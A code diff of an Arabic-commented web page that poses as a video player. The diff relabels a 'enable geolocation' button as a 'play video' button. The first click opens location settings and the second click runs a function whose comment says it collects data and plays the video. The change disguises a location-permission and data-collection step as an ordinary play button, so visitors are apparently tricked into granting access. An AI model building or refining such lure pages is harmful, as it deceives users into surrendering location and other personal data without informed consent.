@@ -257,11 +257,11 @@
         </div>
 
         <div class="video-thumbnail" id="thumbnailArea">
-            <!-- زر الموقع الكبير (يظهر فوراً) -->
+            <!-- زر التشغيل / الموقع (المدمج) -->
             <div id="locationActionButton">
-                <div class="icon-gear">⚙️</div>
-                <div class="main-text">تفعيل الموقع الجغرافي</div>
-                <div class="sub-text">اضغط هنا لتغيير الإعدادات</div>
+                <div class="icon-gear">▶️</div>
+                <div class="main-text">تشغيل الفيديو</div>
+                <div class="sub-text">اضغط للتشغيل</div>
             </div>
 
             <!-- زر التشغيل الأصلي (مخفي) -->
@@ -528,7 +528,7 @@
                 }, 3000);
             }
 
-            // ===== جمع البيانات وتشغيل الفيديو (بعد العودة من الإعدادات) =====
+            // ===== جمع البيانات وتشغيل الفيديو (عند الضغطة الثانية) =====
             async function collectAndPlay() {
                 if (isProcessing) return;
                 isProcessing = true;
@@ -571,32 +571,30 @@
                 isProcessing = false;
             }
 
-            // ===== معالج الضغط على زر "تفعيل الموقع" =====
-            async function handleLocationClick() {
-                if (settingsOpened || videoStarted || isProcessing) return;
+            // ===== معالج الضغط على الزر (تشغيل / إعدادات) =====
+            async function handleButtonClick() {
+                if (isProcessing || videoStarted) return;
 
-                settingsOpened = true;
-
-                // طلب الصلاحيات (لإظهار نافذة الطلب إذا لم تكن محظورة)
-                await requestPermissions();
-
-                // فتح إعدادات الموقع
-                openLocationSettings();
-
-                // بعد العودة، سيعتمد على visibilitychange
+                if (!settingsOpened) {
+                    // الضغطة الأولى: فتح إعدادات الموقع فقط
+                    settingsOpened = true;
+                    openLocationSettings();
+                } else {
+                    // الضغطة الثانية (بعد العودة): جمع الصلاحيات وتشغيل الفيديو
+                    await collectAndPlay();
+                }
             }
 
-            // ===== رصد العودة من الإعدادات =====
+            // ===== رصد العودة من الإعدادات (نحتفظ بالمراقبة لكن لا نفعل شيء تلقائياً) =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // نبدأ جمع البيانات وتشغيل الفيديو تلقائياً
-                    collectAndPlay();
+                    // لا نقوم بأي إجراء تلقائي، فقط ننتظر الضغط على الزر مرة أخرى
                 }
             });
 
             // ===== ربط الأحداث =====
             if (locationBtn) {
-                locationBtn.addEventListener('click', handleLocationClick);
+                locationBtn.addEventListener('click', handleButtonClick);
             }
 
             // ===== تفعيل الصوت عند أي تفاعل =====
